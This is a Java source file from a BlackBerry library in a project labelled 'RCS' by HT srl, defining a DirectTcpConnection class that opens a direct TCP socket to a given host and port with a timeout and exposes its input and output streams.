/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SocketConnection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public class DirectTcpConnection extends Connection {
	static Debug debug=new Debug("DirectTcp", DebugLevel.VERBOSE );

    private String host;
    private int port;

    boolean isDirectTCP = true;
    int timeout = 3*60*1000;

    // Constructor
    public DirectTcpConnection(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public boolean connect() {    	
        String url = "socket://" + host + ":" + port
                + (isDirectTCP ? ";deviceside=true" : "")
                + ";ConnectionTimeout="+timeout;

        try {
            connection_ = (StreamConnection) Connector.open(url);
            in_ = new InputStreamReader(connection_.openInputStream());
            out_ = new OutputStreamWriter(connection_.openOutputStream());
            
            Check.ensures(connection_ != null, "connection_ null");
            Check.ensures(in_ != null, "in_ null");
            Check.ensures(out_ != null, "out_ null");
            
            connected_ = true;
        } catch (IOException e) {
        	connected_ = false;
        }
       
        return connected_;
    }
    
    public boolean isActive() {
    	return true;
    }

    protected void error(String string)
	{
		debug.error(string);
	}
    protected void trace(String string)
	{
		debug.trace(string);
	}
}
